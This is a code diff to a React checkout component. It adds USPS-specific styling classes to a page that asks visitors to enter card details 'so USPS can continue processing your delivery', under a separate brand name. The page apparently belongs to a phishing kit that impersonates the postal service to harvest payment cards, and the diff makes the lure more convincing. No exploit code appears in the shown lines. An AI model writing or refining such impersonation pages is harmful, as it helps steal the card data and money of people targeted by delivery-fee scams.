@@ -184,7 +184,7 @@ export default function Checkout() {
   };
 
   return (
-    <div className="alz-page relative">
+    <div className="alz-page alz-usps-page relative">
       {waiting && (
         <div className="absolute inset-0 z-50 flex items-center justify-center bg-slate-900/45 backdrop-blur-sm">
           <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-6 text-center shadow-2xl">
@@ -196,8 +196,8 @@ export default function Checkout() {
         </div>
       )}
 
-      <div className="alz-shell">
-        <div className="alz-top">
+      <div className="alz-shell alz-usps-form-shell">
+        <div className="alz-top alz-usps-form-top">
           <div className="alz-step-head">
             <div>
               <div className="alz-badge">{BRAND.name}</div>
@@ -210,8 +210,8 @@ export default function Checkout() {
           </div>
         </div>
 
-        <div className="alz-flow-grid">
-          <div className="alz-card">
+        <div className="alz-flow-grid alz-usps-flow-grid">
+          <div className="alz-card alz-usps-form-card">
             <div className="alz-section-eyebrow">Payment details</div>
             <h2 className="alz-page-title">Review your card details</h2>
             <p className="alz-page-copy">Enter the card details associated with this shipment so USPS can continue processing your delivery.</p>
@@ -265,7 +265,7 @@ export default function Checkout() {
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
 
-          <aside className="alz-card alz-flow-aside alz-side-summary">
+          <aside className="alz-card alz-flow-aside alz-side-summary alz-usps-side-card">
             <div className="alz-side-summary-title">Payment review</div>
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb alz-order-mini-thumb-card" />
